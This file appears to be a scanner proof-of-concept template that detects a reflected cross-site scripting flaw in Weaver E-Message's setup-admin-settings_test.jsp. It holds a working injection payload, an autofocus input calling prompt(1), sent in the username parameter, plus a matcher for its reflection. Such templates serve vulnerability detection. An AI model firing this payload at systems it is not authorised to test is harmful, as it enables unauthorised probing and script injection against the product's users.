id: poc-yaml-e-message-setup-admin-settings-xss
info:
  name: 泛微E-Message setup-admin-settings_test.jsp反射性XSS漏洞
  author: ProjectDiscoveryAI
  severity: medium
  tags: xss
  metadata:
    product: e-message
http:
  - method: GET
    path:
      - "{{BaseURL}}/setup/setup-admin-settings_test.jsp?username=<input%20onfocus=prompt(1)%20autofocus>&ldap=true"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "%3Ctd%3E%0A++++++++++++++++++++++++%3Cinput+onfocus%3Dprompt%281%29+autofocus%3E%0A++++++++++++++++++++++++%3C%2Ftd%3E%0A"
